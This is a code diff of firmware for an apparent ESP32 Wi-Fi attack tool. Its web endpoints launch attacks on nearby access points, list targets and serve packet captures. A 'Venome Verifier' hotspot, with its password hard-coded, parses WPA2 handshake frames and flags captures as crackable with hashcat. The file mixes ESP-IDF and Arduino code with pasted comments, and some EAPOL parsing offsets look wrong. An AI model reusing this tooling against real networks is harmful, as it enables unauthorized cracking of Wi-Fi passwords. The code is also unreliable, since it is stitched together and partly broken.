+  httpd_resp_set_type(req, "text/html");
+  const char *response = "<!DOCTYPE html><html><head><meta http-equiv='refresh' content='3;url=/'></head><body><center><h2>✅ Switching to PacketWiFi...</h2><p>ESP32 will restart. Connect to 'WiPhi_34732' after reboot.</p></center></body></html>";
+  httpd_resp_send(req, response, strlen(response));
+
+  // 4. Force WiFi off and restart
+  ESP_LOGI(TAG_WEBSERVER, "Restarting ESP32...");
+  esp_wifi_stop();
+  esp_wifi_deinit();
+
+  vTaskDelay(pdMS_TO_TICKS(100));
+  esp_restart();
+
+  return ESP_OK;
+}
+
+static httpd_uri_t uri_switch_packetwifi_get = {
+    .uri = "/switchPacketWifi",
+    .method = HTTP_GET,
+    .handler = uri_switch_packetwifi_get_handler,
+    .user_ctx = NULL};
+//@}
+
+/**
+ * @brief Handlers for \c /reset endpoint
+ *
+ * This endpoint resets the attack logic to initial READY state.
+ * @param req
+ * @return esp_err_t
+ * @{
+ */
+static esp_err_t uri_reset_head_handler(httpd_req_t *req)
+{
+  ESP_ERROR_CHECK(esp_event_post(WEBSERVER_EVENTS, 1, NULL, 0, portMAX_DELAY)); // 1 = ATTACK_RESET
+  return httpd_resp_send(req, NULL, 0);
+}
+
+static httpd_uri_t uri_reset_head = {
+    .uri = "/reset",
+    .method = HTTP_HEAD,
+    .handler = uri_reset_head_handler,
+    .user_ctx = NULL};
+//@}
+
+/**
+ * @brief Handlers for \c /ap-list endpoint
+ *
+ * This endpoint returns list of available APs nearby.
+ * It calls wifi_controller ap_scanner and serialize their SSIDs into octet response.
+ * @attention reponse may take few seconds
+ * @attention client may be disconnected from ESP AP after calling this endpoint
+ * @param req
+ * @return esp_err_t
+ * @{
+ */
+static esp_err_t uri_ap_list_get_handler(httpd_req_t *req)
+{
+  wifictl_scan_nearby_aps();
+
+  const wifictl_ap_records_t *ap_records;
+  ap_records = wifictl_get_ap_records();
+
+  // 33 SSID + 6 BSSID + 1 RSSI
+  char resp_chunk[40];
+
+  ESP_ERROR_CHECK(httpd_resp_set_type(req, HTTPD_TYPE_OCTET));
+  for (unsigned i = 0; i < ap_records->count; i++)
+  {
+    memcpy(resp_chunk, ap_records->records[i].ssid, 33);
+    memcpy(&resp_chunk[33], ap_records->records[i].bssid, 6);
+    memcpy(&resp_chunk[39], &ap_records->records[i].rssi, 1);
+    ESP_ERROR_CHECK(httpd_resp_send_chunk(req, resp_chunk, 40));
+  }
+  return httpd_resp_send_chunk(req, NULL, 0);
+}
+
+static httpd_uri_t uri_ap_list_get = {
+    .uri = "/ap-list",
+    .method = HTTP_GET,
+    .handler = uri_ap_list_get_handler,
+    .user_ctx = NULL};
+//@}
+
+/**
+ * @brief Handlers for \c /run-attack endpoint
+ *
+ * This endpoint receives attack configuration from client. It deserialize it from octet stream to attack_request_t structure.
+ * @param req
+ * @return esp_err_t
+ * @{
+ */
+static esp_err_t uri_run_attack_post_handler(httpd_req_t *req)
+{
+  attack_request_t attack_request;
+  httpd_req_recv(req, (char *)&attack_request, sizeof(attack_request_t));
+  esp_err_t res = httpd_resp_send(req, NULL, 0);
+  ESP_ERROR_CHECK(esp_event_post(WEBSERVER_EVENTS, 0, &attack_request, sizeof(attack_request_t), portMAX_DELAY)); // 0 = ATTACK_REQUEST
+  return res;
+}
+
+static httpd_uri_t uri_run_attack_post = {
+    .uri = "/run-attack",
+    .method = HTTP_POST,
+    .handler = uri_run_attack_post_handler,
+    .user_ctx = NULL};
+//@}
+
+/**
+ * @brief Handlers for \c /status endpoint
+ *
+ * This endpoint fetches current status from main component attack wrapper, serialize it and sends it to client as octet stream.
+ * @param req
+ * @return esp_err_t
+ * @{
+ */
+static esp_err_t uri_status_get_handler(httpd_req_t *req)
+{
+  ESP_LOGD(TAG_WEBSERVER, "Fetching attack status...");
+  const attack_status_t *attack_status;
+  attack_status = attack_get_status();
+
+  ESP_ERROR_CHECK(httpd_resp_set_type(req, HTTPD_TYPE_OCTET));
+  // first send attack result header
+  ESP_ERROR_CHECK(httpd_resp_send_chunk(req, (char *)attack_status, 4));
+  // send attack result content
+  if (((attack_status->state == FINISHED) || (attack_status->state == TIMEOUT)) && (attack_status->content_size > 0))
+  {
+    ESP_ERROR_CHECK(httpd_resp_send_chunk(req, attack_status->content, attack_status->content_size));
+  }
+  return httpd_resp_send_chunk(req, NULL, 0);
+}
+
+static httpd_uri_t uri_status_get = {
+    .uri = "/status",
+    .method = HTTP_GET,
+    .handler = uri_status_get_handler,
+    .user_ctx = NULL};
+//@}
+
+/**
+ * @brief Handlers for \c /capture.pcap endpoint
+ *
+ * This endpoint forwards PCAP binary data from pcap_serializer via octet stream to client.
+ *
+ * @note Most browsers will start download process when this endpoint is called.
+ * @param req
+ * @return esp_err_t
+ * @{
+ */
+static esp_err_t uri_capture_pcap_get_handler(httpd_req_t *req)
+{
+  ESP_LOGD(TAG_WEBSERVER, "Providing PCAP file...");
+  ESP_ERROR_CHECK(httpd_resp_set_type(req, HTTPD_TYPE_OCTET));
+  return httpd_resp_send(req, (char *)pcap_serializer_get_buffer(), pcap_serializer_get_size());
+}
+
+static httpd_uri_t uri_capture_pcap_get = {
+    .uri = "/capture.pcap",
+    .method = HTTP_GET,
+    .handler = uri_capture_pcap_get_handler,
+    .user_ctx = NULL};
+//@}
+
+/**
+ * @brief Handlers for \c /switchVenomeVerifier endpoint
+ *
+ * This endpoint switches to Venome Verifier mode
+ * @param req
+ * @return esp_err_t
+ * @{
+ */
+static esp_err_t uri_switch_venome_verifier_get_handler(httpd_req_t *req)
+{
+  // Send response
+  httpd_resp_set_type(req, "text/html");
+  const char *response = "<!DOCTYPE html><html><head><meta http-equiv='refresh' content='3;url=/'></head><body><center><h2>✅ Switching to PCAP Verifier...</h2><p>ESP32 will restart. Connect to 'VENOME v3' after reboot.</p></center></body></html>";
+  httpd_resp_send(req, response, strlen(response));
+
+  Serial.println("🔄 Switching to PCAP Verifier from Venome Project...");
+
+  // Write to Preferences
+  Preferences prefs;
+  prefs.begin("boot", false);
+  prefs.putInt("mode", 2); // 2 = Venome Verifier
+  prefs.end();
+
+  delay(1000);
+  esp_restart();
+
+  return ESP_OK;
+}
+static httpd_uri_t uri_switch_venome_verifier_get = {
+    .uri = "/switchVenomeVerifier",
+    .method = HTTP_GET,
+    .handler = uri_switch_venome_verifier_get_handler,
+    .user_ctx = NULL};
+//@}
+
+void webserver_run()
+{
+  ESP_LOGD(TAG_WEBSERVER, "Running webserver");
+
+  httpd_config_t config = HTTPD_DEFAULT_CONFIG();
+  httpd_handle_t server = NULL;
+
+  ESP_ERROR_CHECK(httpd_start(&server, &config));
+  ESP_ERROR_CHECK(httpd_register_uri_handler(server, &uri_root_get));
+  ESP_ERROR_CHECK(httpd_register_uri_handler(server, &uri_reset_head));
+  ESP_ERROR_CHECK(httpd_register_uri_handler(server, &uri_ap_list_get));
+  ESP_ERROR_CHECK(httpd_register_uri_handler(server, &uri_run_attack_post));
+  ESP_ERROR_CHECK(httpd_register_uri_handler(server, &uri_status_get));
+  ESP_ERROR_CHECK(httpd_register_uri_handler(server, &uri_capture_pcap_get));
+  ESP_ERROR_CHECK(httpd_register_uri_handler(server, &uri_switch_packetwifi_get)); // 👈 YEH LINE ADD KARO
+
+  // 👇 ADD THIS NEW HANDLER FOR VENOME VERIFIER SWITCH
+
+  ESP_ERROR_CHECK(httpd_register_uri_handler(server, &uri_switch_venome_verifier_get));
+}
+
+void handleFont()
+{
+  String path = webServer.uri();
+
+  // Security check - sirf fonts folder se serve karo
+  if (path.indexOf("/fonts/") != 0)
+  {
+    webServer.send(404, "text/plain", "Not Found");
+    return;
+  }
+
+  // Extract filename
+  String filename = path.substring(7); // "/fonts/" ke baad ka part
+
+  // Open file from LittleFS
+  File file = LittleFS.open("/" + filename, "r");
+  if (!file)
+  {
+    webServer.send(404, "text/plain", "Font not found");
+    return;
+  }
+
+  // Set correct content type
+  if (filename.endsWith(".ttf"))
+  {
+    webServer.streamFile(file, "font/ttf");
+  }
+  else if (filename.endsWith(".woff"))
+  {
+    webServer.streamFile(file, "font/woff");
+  }
+  else if (filename.endsWith(".woff2"))
+  {
+    webServer.streamFile(file, "font/woff2");
+  }
+  else
+  {
+    webServer.streamFile(file, "application/octet-stream");
+  }
+
+  file.close();
+}
+
+//---------------------------------------------------------- VENOME VERIFIER ------------------------------------
+#include <Arduino.h>
+#include <WiFi.h>
+#include <AsyncTCP.h>
+#include <ESPAsyncWebServer.h>
+#include <SPIFFS.h>
+#include <LittleFS.h>
+#include <ArduinoJson.h>
+#include <vector>
+#include <map>
+
+// ==================== WiFi Configuration ====================
+const char *AP_SSID = "VENOME v3";
+const char *AP_PASSWORD = "Venome@kali";
+
+// ==================== Web Server ====================
+AsyncWebServer server(80);
+AsyncWebSocket ws("/ws");
+
+// ==================== PCAP Analysis Structures ====================
+
+// Frame Control field structure
+struct FrameControl
+{
+  uint8_t protocolVersion : 2;
+  uint8_t type : 2;
+  uint8_t subtype : 4;
+  uint8_t toDS : 1;
+  uint8_t fromDS : 1;
+  uint8_t moreFrag : 1;
+  uint8_t retry : 1;
+  uint8_t pwrMgmt : 1;
+  uint8_t moreData : 1;
+  uint8_t protectedFrame : 1;
+  uint8_t order : 1;
+} __attribute__((packed));
+
+// Radio Tap Header (for monitoring mode captures)
+struct RadioTapHeader
+{
+  uint8_t revision;
+  uint8_t pad;
+  uint16_t length;
+  uint32_t present;
+} __attribute__((packed));
+
+// 802.11 Data Frame Header
+struct DataFrameHeader
+{
+  FrameControl frameControl;
+  uint16_t duration;
+  uint8_t addr1[6]; // Destination
+  uint8_t addr2[6]; // Source
+  uint8_t addr3[6]; // BSSID
+  uint16_t seqCtrl;
+} __attribute__((packed));
+
+// LLC/SNAP Header (after 802.11 header)
+struct LLCSnapHeader
+{
+  uint8_t dsap;       // 0xAA
+  uint8_t ssap;       // 0xAA
+  uint8_t control;    // 0x03
+  uint8_t orgCode[3]; // 0x00 0x00 0x00
+  uint16_t etherType; // 0x888E for EAPOL
+} __attribute__((packed));
+
+// EAPOL Header
+struct EAPOLHeader
+{
+  uint8_t version;
+  uint8_t packetType;
+  uint16_t packetLength;
+} __attribute__((packed));
+
+// EAPOL Key Packet (for handshake messages)
+struct EAPOLKeyPacket
+{
+  uint8_t descriptorType; // 0x02 for WPA2
+  uint16_t keyInfo;
+  uint16_t keyLength;
+  uint64_t replayCounter;
+  uint8_t keyNonce[32];
+  uint8_t keyIV[16];
+  uint8_t keyRSC[8];
+  uint8_t keyID[8];
+  uint8_t keyMIC[16];
+  uint16_t keyDataLength;
+  uint8_t keyData[];
+} __attribute__((packed));
+
+// PCAP Global Header
+struct PCAPGlobalHeader
+{
+  uint32_t magicNumber;  // 0xA1B2C3D4
+  uint16_t versionMajor; // 2
+  uint16_t versionMinor; // 4
+  int32_t thisZone;      // 0
+  uint32_t sigFigs;      // 0
+  uint32_t snapLen;      // 65535
+  uint32_t network;      // 1 for Ethernet, 105 for 802.11
+} __attribute__((packed));
+
+// PCAP Packet Header
+struct PCAPPacketHeader
+{
+  uint32_t tsSec;
+  uint32_t tsUsec;
+  uint32_t inclLen; // Captured length
+  uint32_t origLen; // Original length
+} __attribute__((packed));
+
+// ==================== Handshake Analysis Results ====================
+struct HandshakeMessage
+{
+  int messageNumber; // 1,2,3,4
+  String direction;  // "AP -> STA" or "STA -> AP"
+  String clientMAC;
+  String apMAC;
+  bool hasMIC;
+  bool hasNonce;
+  uint8_t nonce[32];
+  uint8_t mic[16];
+  uint32_t timestamp;
+  int frameIndex;
+};
+
+struct HandshakeAnalysis
+{
+  bool validPCAP = false;
+  String errorMessage = "";
+  int totalFrames = 0;
+  int eapolFrames = 0;
+  std::vector<HandshakeMessage> messages;
+  bool hasMessage1 = false;
+  bool hasMessage2 = false;
+  bool hasMessage3 = false;
+  bool hasMessage4 = false;
+  String targetSSID = "";
+  uint8_t targetBSSID[6] = {0};
+  String clientMAC = "";
+  String apMAC = "";
+  String handshakeStatus = "INCOMPLETE";
+  int completionPercentage = 0;
+
+  // For display
+  String getStatusString()
+  {
+    String status = "Handshake Analysis:\n";
+    status += "═══════════════════════════════\n";
+    status += "Total Frames: " + String(totalFrames) + "\n";
+    status += "EAPOL Frames: " + String(eapolFrames) + "\n";
+    status += "═══════════════════════════════\n";
+    status += "Message 1 (AP → STA): " + String(hasMessage1 ? "✅" : "❌") + "\n";
+    status += "Message 2 (STA → AP): " + String(hasMessage2 ? "✅" : "❌") + "\n";
+    status += "Message 3 (AP → STA): " + String(hasMessage3 ? "✅" : "❌") + "\n";
+    status += "Message 4 (STA → AP): " + String(hasMessage4 ? "✅" : "❌") + "\n";
+    status += "═══════════════════════════════\n";
+    status += "Status: " + handshakeStatus + " (" + String(completionPercentage) + "%)\n";
+
+    if (hasMessage1 && hasMessage2 && hasMessage3 && hasMessage4)
+    {
+      status += "✅ COMPLETE 4-WAY HANDSHAKE CAPTURED!\n";
+      status += "AP MAC: " + apMAC + "\n";
+      status += "Client MAC: " + clientMAC + "\n";
+    }
+    else if (hasMessage1 && hasMessage2)
+    {
+      status += "⚠️ M1+M2 captured - Can crack with hashcat (-m 22000)\n";
+    }
+
+    return status;
+  }
+
+  String getJSON()
+  {
+    String json = "{";
+    json += "\"valid\":" + String(validPCAP ? "true" : "false") + ",";
+    json += "\"totalFrames\":" + String(totalFrames) + ",";
+    json += "\"eapolFrames\":" + String(eapolFrames) + ",";
+    json += "\"hasM1\":" + String(hasMessage1 ? "true" : "false") + ",";
+    json += "\"hasM2\":" + String(hasMessage2 ? "true" : "false") + ",";
+    json += "\"hasM3\":" + String(hasMessage3 ? "true" : "false") + ",";
+    json += "\"hasM4\":" + String(hasMessage4 ? "true" : "false") + ",";
+    json += "\"percentage\":" + String(completionPercentage) + ",";
+    json += "\"status\":\"" + handshakeStatus + "\",";
+    json += "\"apMAC\":\"" + apMAC + "\",";
+    json += "\"clientMAC\":\"" + clientMAC + "\"";
+    json += "}";
+    return json;
+  }
+};
+
+// ==================== PCAP Parser Class ====================
+class PCAPParser
+{
+private:
+  uint8_t *buffer;
+  size_t bufferSize;
+  PCAPGlobalHeader globalHeader;
+  bool valid = false;
+
+  String macToString(const uint8_t *mac)
+  {
+    char macStr[18];
+    snprintf(macStr, sizeof(macStr), "%02x:%02x:%02x:%02x:%02x:%02x",
+             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
+    return String(macStr);
+  }
+
+  bool isEAPOL(const uint8_t *data, int len)
+  {
+    if (len < 14)
+      return false; // Min Ethernet frame size
+
+    // Check for LLC/SNAP header with EAPOL ethertype
+    LLCSnapHeader *llc = (LLCSnapHeader *)data;
+    if (llc->dsap == 0xAA && llc->ssap == 0xAA &&
+        llc->control == 0x03 && llc->orgCode[0] == 0 &&
+        llc->orgCode[1] == 0 && llc->orgCode[2] == 0)
+    {
+      return (ntohs(llc->etherType) == 0x888E);
+    }
+    return false;
+  }
+
+  // ==================== COMBINED MESSAGE DETECTION ====================
+  int detect_message_type(const uint8_t *eapol_data, size_t eapol_len, bool from_ap)
+  {
+    if (eapol_len < 4)
+      return 0;
+
+    // Check if it's EAPOL-Key (type 3)
+    if (eapol_data[1] != 0x03)
+      return 0;
+
+    if (eapol_len < 4 + 2)
+      return 0;
+
+    // Get EAPOL total length
+    uint16_t eapol_total_len = (eapol_data[2] << 8) | eapol_data[3];
+
+    // Parse key_info
+    uint16_t key_info = (eapol_data[4] << 8) | eapol_data[5];
+
+    bool ack = (key_info & 0x80) != 0;
+    bool mic = (key_info & 0x100) != 0;
+    bool install = (key_info & 0x40) != 0;
+    bool secure = (key_info & 0x200) != 0;
+
+    // METHOD 1: Length-based detection
+    if (from_ap && eapol_total_len == 137)
+    {
+      Serial.println("📊 Length-based M1 detected");
+      return 1;
+    }
+    if (!from_ap && eapol_total_len == 159)
+    {
+      Serial.println("📊 Length-based M2 detected");
+      return 2;
+    }
+    if (from_ap && eapol_total_len == 175)
+    {
+      Serial.println("📊 Length-based M3 detected");
+      return 3;
+    }
+    if (eapol_total_len == 95)
+    {
+      Serial.println("📊 Length-based M4 detected");
+      return 4;
+    }
+
+    // METHOD 2: MIC/Nonce based detection
+    bool micEmpty = true;
+    bool nonceEmpty = true;
+
+    for (int i = 0; i < 16; i++)
+    {
+      if (eapol_data[13 + i] != 0)
+      {
+        micEmpty = false;
+        break;
+      }
+    }
+
+    for (int i = 0; i < 32; i++)
+    {
+      if (eapol_data[5 + i] != 0)
+      {
+        nonceEmpty = false;
+        break;
+      }
+    }
+
+    if (from_ap && micEmpty && !nonceEmpty)
+    {
+      Serial.println("🔍 MIC/Nonce M1 detected");
+      return 1;
+    }
+    if (!from_ap && !micEmpty && !nonceEmpty)
+    {
+      Serial.println("🔍 MIC/Nonce M2 detected");
+      return 2;
+    }
+    if (from_ap && !micEmpty && !nonceEmpty)
+    {
+      Serial.println("🔍 MIC/Nonce M3 detected");
+      return 3;
+    }
+    if (!from_ap && !micEmpty && nonceEmpty)
+    {
+      Serial.println("🔍 MIC/Nonce M4 detected");
+      return 4;
+    }
+
+    return 0;
+  }
+
+public:
+  PCAPParser(uint8_t *buf, size_t size) : buffer(buf), bufferSize(size)
+  {
+    if (size < sizeof(PCAPGlobalHeader))
+    {
+      valid = false;
+      return;
+    }
+
+    memcpy(&globalHeader, buffer, sizeof(PCAPGlobalHeader));
+
+    // Check magic number
+    if (globalHeader.magicNumber == 0xA1B2C3D4)
+    {
+      valid = true;
+    }
+    else if (globalHeader.magicNumber == 0xD4C3B2A1)
+    {
+      // Byte-swapped, would need conversion
+      valid = false;
+    }
+    else
+    {
+      valid = false;
+    }
+  }
+
+  // Sirf M1 detect karne wala method (Neeche wala)
+  // Sirf M1 detect karne wala method (Neeche wala)
+  HandshakeAnalysis analyzeM1Only()
+  {
+    HandshakeAnalysis result;
+
+    if (!valid)
+    {
+      result.errorMessage = "Invalid PCAP format";
+      return result;
+    }
+
+    result.validPCAP = true;
+
+    size_t offset = sizeof(PCAPGlobalHeader);
+    int frameIndex = 0;
+
+    while (offset + sizeof(PCAPPacketHeader) <= bufferSize)
+    {
+      PCAPPacketHeader *pktHeader = (PCAPPacketHeader *)(buffer + offset);
+      offset += sizeof(PCAPPacketHeader);
+
+      uint32_t packetLen = pktHeader->inclLen;
+      if (offset + packetLen > bufferSize)
+        break;
+
+      result.totalFrames++;
+      uint8_t *packetData = buffer + offset;
+
+      // Check for Radio Tap header
+      int dataOffset = 0;
+      if (packetLen > 0 && packetData[0] == 0)
+      {
+        RadioTapHeader *rt = (RadioTapHeader *)packetData;
+        if (rt->revision == 0 && rt->length <= packetLen)
+        {
+          dataOffset = rt->length;
+        }
+      }
+
+      // Skip Radiotap and get to 802.11 header
+      if (packetLen > dataOffset + sizeof(DataFrameHeader))
+      {
+        DataFrameHeader *wifiHeader = (DataFrameHeader *)(packetData + dataOffset);
+
+        if (wifiHeader->frameControl.type == 2 &&
+            wifiHeader->frameControl.protectedFrame == 0)
+        {
+
+          int llcOffset = dataOffset + sizeof(DataFrameHeader);
+          if (wifiHeader->frameControl.subtype > 7)
+            llcOffset += 2;
+
+          if (packetLen > llcOffset + sizeof(LLCSnapHeader))
+          {
+            LLCSnapHeader *llc = (LLCSnapHeader *)(packetData + llcOffset);
+
+            if (llc->dsap == 0xAA && llc->ssap == 0xAA &&
+                llc->control == 0x03 && llc->orgCode[0] == 0 &&
+                llc->orgCode[1] == 0 && llc->orgCode[2] == 0 &&
+                ntohs(llc->etherType) == 0x888E)
+            {
+
+              result.eapolFrames++;
+
+              int eapolOffset = llcOffset + sizeof(LLCSnapHeader);
+              EAPOLHeader *eapol = (EAPOLHeader *)(packetData + eapolOffset);
+
+              if (eapol->packetType == 0x03)
+              {
+                EAPOLKeyPacket *key = (EAPOLKeyPacket *)(packetData + eapolOffset + sizeof(EAPOLHeader));
+
+                // Direction detection
+                bool toDS = wifiHeader->frameControl.toDS;
+                bool fromDS = wifiHeader->frameControl.fromDS;
+                bool fromAP = false;
+
+                if (toDS == 0 && fromDS == 1)
+                  fromAP = true;
+                else if (toDS == 1 && fromDS == 0)
+                  fromAP = false;
+                else if (toDS == 0 && fromDS == 0)
+                  fromAP = (memcmp(wifiHeader->addr2, wifiHeader->addr3, 6) == 0);
+                else
+                  continue;
+
+                // SIRF M1 DETECTION - Neeche wala method
+                uint16_t keyInfo = ntohs(key->keyInfo);
+                bool fromAP_key = ((keyInfo >> 3) & 1) == 1;
+
+                bool micEmpty = true;
+                for (int i = 0; i < 16; i++)
+                {
+                  if (key->keyMIC[i] != 0)
+                  {
+                    micEmpty = false;
+                    break;
+                  }
+                }
+
+                bool nonceEmpty = true;
+                for (int i = 0; i < 32; i++)
+                {
+                  if (key->keyNonce[i] != 0)
+                  {
+                    nonceEmpty = false;
+                    break;
+                  }
+                }
+
+                // Neeche wale project ka M1 detection
+                if (fromAP && fromAP_key && micEmpty && !nonceEmpty)
+                {
+                  Serial.println("📡 M1 detected (Neeche wala method)");
+
+                  HandshakeMessage msg;
+                  msg.messageNumber = 1;
+                  msg.frameIndex = frameIndex;
+                  msg.timestamp = pktHeader->tsSec;
+                  msg.direction = "AP → STA";
+                  msg.clientMAC = macToString(wifiHeader->addr1);
+                  msg.apMAC = macToString(wifiHeader->addr3);
+                  msg.hasMIC = false;
+                  msg.hasNonce = true;
+                  memcpy(msg.nonce, key->keyNonce, 32);
+                  memset(msg.mic, 0, 16);
+
+                  result.hasMessage1 = true;
+                  result.messages.push_back(msg);
+
+                  if (result.apMAC == "")
+                    result.apMAC = msg.apMAC;
+                  if (result.clientMAC == "")
+                    result.clientMAC = msg.clientMAC;
+                }
+              }
+            }
+          }
+        }
+      }
+      offset += packetLen;
+      frameIndex++;
+    }
+
+    // Calculate percentage
+    result.completionPercentage = result.hasMessage1 ? 25 : 0;
+    result.handshakeStatus = result.hasMessage1 ? "PARTIAL (M1 only)" : "INCOMPLETE";
+
+    return result;
+  }
+
+  // Sirf M2,M3,M4 detect karne wala method (Upper wala)
+  HandshakeAnalysis analyzeM234Only()
+  {
+    HandshakeAnalysis result = analyze(); // Pehle normal analysis karo
+
+    // Sirf M2,M3,M4 rakho, M1 hatao
+    result.hasMessage1 = false;
+
+    // Messages vector se bhi M1 hatao
+    std::vector<HandshakeMessage> filteredMessages;
+    for (auto &msg : result.messages)
+    {
+      if (msg.messageNumber != 1)
+      {
+        filteredMessages.push_back(msg);
+      }
+    }
+    result.messages = filteredMessages;
+
+    // Percentage recalculate karo
+    int count = 0;
+    if (result.hasMessage2)
+      count++;
+    if (result.hasMessage3)
+      count++;
+    if (result.hasMessage4)
+      count++;
+    result.completionPercentage = (count * 100) / 3; // Total 3 messages
+
+    if (result.hasMessage2 && result.hasMessage3 && result.hasMessage4)
+    {
+      result.handshakeStatus = "COMPLETE (M2+M3+M4)";
+    }
+    else if (result.hasMessage2)
+    {
+      result.handshakeStatus = "PARTIAL (M2 only)";
+    }
+    else
+    {
+      result.handshakeStatus = "INCOMPLETE";
+    }
+
+    return result;
+  }
+  HandshakeAnalysis analyze()
+  {
+    HandshakeAnalysis result;
+
+    if (!valid)
+    {
+      result.errorMessage = "Invalid PCAP format";
+      return result;
+    }
+
+    result.validPCAP = true;
+
+    size_t offset = sizeof(PCAPGlobalHeader);
+    int frameIndex = 0;
+
+    while (offset + sizeof(PCAPPacketHeader) <= bufferSize)
+    {
+      PCAPPacketHeader *pktHeader = (PCAPPacketHeader *)(buffer + offset);
+      offset += sizeof(PCAPPacketHeader);
+
+      uint32_t packetLen = pktHeader->inclLen;
+
+      if (offset + packetLen > bufferSize)
+      {
+        break;
+      }
+
+      result.totalFrames++;
+
+      uint8_t *packetData = buffer + offset;
+
+      // Check for Radio Tap header
+      int dataOffset = 0;
+      if (packetLen > 0 && packetData[0] == 0)
+      {
+        RadioTapHeader *rt = (RadioTapHeader *)packetData;
+        if (rt->revision == 0 && rt->length <= packetLen)
+        {
+          dataOffset = rt->length;
+        }
+      }
+
+      // Skip Radiotap and get to 802.11 header
+      if (packetLen > dataOffset + sizeof(DataFrameHeader))
+      {
+        DataFrameHeader *wifiHeader = (DataFrameHeader *)(packetData + dataOffset);
+
+        // Check if it's a data frame (type 2) and not protected
+        if (wifiHeader->frameControl.type == 2 &&
+            wifiHeader->frameControl.protectedFrame == 0)
+        {
+
+          int llcOffset = dataOffset + sizeof(DataFrameHeader);
+
+          // Skip QoS field if present
+          if (wifiHeader->frameControl.subtype > 7)
+          {
+            llcOffset += 2;
+          }
+
+          if (packetLen > llcOffset + sizeof(LLCSnapHeader))
+          {
+            LLCSnapHeader *llc = (LLCSnapHeader *)(packetData + llcOffset);
+
+            // Check for EAPOL
+            if (llc->dsap == 0xAA && llc->ssap == 0xAA &&
+                llc->control == 0x03 && llc->orgCode[0] == 0 &&
+                llc->orgCode[1] == 0 && llc->orgCode[2] == 0 &&
+                ntohs(llc->etherType) == 0x888E)
+            {
+
+              result.eapolFrames++;
+
+              // Parse EAPOL
+              int eapolOffset = llcOffset + sizeof(LLCSnapHeader);
+              EAPOLHeader *eapol = (EAPOLHeader *)(packetData + eapolOffset);
+
+              if (eapol->packetType == 0x03)
+              { // EAPOL-Key
+                EAPOLKeyPacket *key = (EAPOLKeyPacket *)(packetData + eapolOffset + sizeof(EAPOLHeader));
+
+                // Direction detection using 802.11 frame control bits
+                bool toDS = wifiHeader->frameControl.toDS;
+                bool fromDS = wifiHeader->frameControl.fromDS;
+                bool fromAP = false;
+
+                if (toDS == 0 && fromDS == 1)
+                {
+                  fromAP = true; // AP -> STA
+                }
+                else if (toDS == 1 && fromDS == 0)
+                {
+                  fromAP = false; // STA -> AP
+                }
+                else if (toDS == 0 && fromDS == 0)
+                {
+                  fromAP = (memcmp(wifiHeader->addr2, wifiHeader->addr3, 6) == 0);
+                }
+                else
+                {
+                  continue; // Skip WDS frames
+                }
+
+                // Detect message type using combined method
+                int msgType = detect_message_type((uint8_t *)eapol, eapol->packetLength + 4, fromAP);
+
+                HandshakeMessage msg;
+                msg.frameIndex = frameIndex;
+                msg.timestamp = pktHeader->tsSec;
+                msg.direction = fromAP ? "AP → STA" : "STA → AP";
+
+                msg.clientMAC = macToString(fromAP ? wifiHeader->addr1 : wifiHeader->addr2);
+                msg.apMAC = macToString(wifiHeader->addr3);
+
+                // Save for result
+                if (result.apMAC == "")
+                  result.apMAC = msg.apMAC;
+                if (result.clientMAC == "")
+                  result.clientMAC = msg.clientMAC;
+
+                // Check if MIC is present
+                msg.hasMIC = true;
+                for (int i = 0; i < 16; i++)
+                {
+                  if (key->keyMIC[i] != 0)
+                    break;
+                  if (i == 15)
+                    msg.hasMIC = false;
+                }
+
+                msg.hasNonce = true;
+                for (int i = 0; i < 32; i++)
+                {
+                  if (key->keyNonce[i] != 0)
+                    break;
+                  if (i == 31)
+                    msg.hasNonce = false;
+                }
+
+                memcpy(msg.nonce, key->keyNonce, 32);
+                memcpy(msg.mic, key->keyMIC, 16);
+
+                // Set message number
+                if (msgType == 1)
+                {
+                  msg.messageNumber = 1;
+                  result.hasMessage1 = true;
+                  result.messages.push_back(msg);
+                }
+                else if (msgType == 2)
+                {
+                  msg.messageNumber = 2;
+                  result.hasMessage2 = true;
+                  result.messages.push_back(msg);
+                }
+                else if (msgType == 3)
+                {
+                  msg.messageNumber = 3;
+                  result.hasMessage3 = true;
+                  result.messages.push_back(msg);
+                }
+                else if (msgType == 4)
+                {
+                  msg.messageNumber = 4;
+                  result.hasMessage4 = true;
+                  result.messages.push_back(msg);
+                }
+              }
+            }
+          }
+        }
+      }
+
+      offset += packetLen;
+      frameIndex++;
+    }
+
+    // Calculate completion percentage
+    int count = 0;
+    if (result.hasMessage1)
+      count++;
+    if (result.hasMessage2)
+      count++;
+    if (result.hasMessage3)
+      count++;
+    if (result.hasMessage4)
+      count++;
+    result.completionPercentage = (count * 100) / 4;
+
+    if (result.hasMessage1 && result.hasMessage2 && result.hasMessage3 && result.hasMessage4)
+    {
+      result.handshakeStatus = "COMPLETE";
+    }
+    else if (result.hasMessage1 && result.hasMessage2)
+    {
+      result.handshakeStatus = "PARTIAL (M1+M2)";
+    }
+    else if (result.hasMessage1)
+    {
+      result.handshakeStatus = "PARTIAL (M1 only)";
+    }
+    else
+    {
+      result.handshakeStatus = "INCOMPLETE";
+    }
+
+    return result;
+  }
+};
+
+// ==================== Global Variables ====================
+HandshakeAnalysis lastAnalysis;
+String uploadStatus = "";
+bool analysisDone = false;
+
+// ==================== HTML Page ====================
+const char index_html[] PROGMEM = R"rawliteral(
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>VENOME VERIFIER // HANDSHAKE ANALYZER</title>
+    <style>
+        /* Google Fonts import hatao aur local fonts use karo */
+          @font-face {
+              font-family: 'Orbitron';
+              font-style: normal;
+              font-weight: 400;
+              src: url('/fonts/Orbitron-Regular.ttf') format('truetype');
+          }
+
+          @font-face {
+              font-family: 'Orbitron';
+              font-style: normal;
+              font-weight: 600;
+              src: url('/fonts/Orbitron-SemiBold.ttf') format('truetype');
+          }
+
+          @font-face {
+              font-family: 'Orbitron';
+              font-style: normal;
+              font-weight: 800;
+              src: url('/fonts/Orbitron-ExtraBold.ttf') format('truetype');
+          }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #0a0f1f;
+            color: #fff;
+            font-family: 'Orbitron', sans-serif;
+            min-height: 100vh;
+            padding: 20px;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at 20% 50%, rgba(255, 0, 255, 0.1) 0%, transparent 50%),
